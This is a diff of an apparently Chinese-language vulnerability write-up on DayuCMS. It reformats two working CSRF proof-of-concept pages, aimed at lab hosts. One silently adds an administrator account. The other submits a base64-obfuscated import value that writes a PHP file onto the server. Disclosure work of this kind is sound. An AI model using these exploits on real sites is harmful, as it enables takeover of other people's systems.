@@ -26,27 +26,29 @@
 
 <p>下面简单给个PoC代码</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-    <span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://localhost/dayucms/dayucms.php?file=admin&amp;action=add&amp;roleid=1&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;do_submit&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[roleid]&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[username]&quot;</span> <span class="na">value=</span><span class="s">&quot;larry&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[password]&quot;</span> <span class="na">value=</span><span class="s">&quot;larry&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[category][]&quot;</span> <span class="na">value=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[allowmultilogin]&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[disabled]&quot;</span> <span class="na">value=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;/form&gt;</span>
+<div>
+  <pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action=&quot;http://localhost/dayucms/dayucms.php?file=admin&amp;action=add&amp;roleid=1&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;do_submit&quot; value=&quot;1&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[roleid]&quot; value=&quot;1&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[username]&quot; value=&quot;larry&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[password]&quot; value=&quot;larry&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[category][]&quot; value=&quot;0&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[allowmultilogin]&quot; value=&quot;1&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;newadmin[disabled]&quot; value=&quot;0&quot;&gt;
+    &lt;/form&gt;
 
-    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
-        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span></code></pre></div>
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
 
 <p>最后使用虚拟机搭建PoC来验证CSRF，结果可成功添加管理员：</p>
 
@@ -82,21 +84,23 @@
 
 <p>PoC代码如下：</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-    <span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://192.168.1.103/dayucms/dayucms.php?mod=gather&amp;file=gather&amp;action=import&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;do_submit&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;importdata&quot;</span> <span class="na">value=</span><span class="s">&quot;bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp&quot;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;1&quot;</span> <span class="na">value=</span><span class="s">&quot;导入规则&quot;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;/form&gt;</span>
+<div>
+  <pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action=&quot;http://192.168.1.103/dayucms/dayucms.php?mod=gather&amp;file=gather&amp;action=import&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;do_submit&quot; value=&quot;1&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;importdata&quot; value=&quot;bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;1&quot; value=&quot;导入规则&quot;&gt;
+    &lt;/form&gt;
 
-    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
-        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
-    <span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span></code></pre></div>
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
 
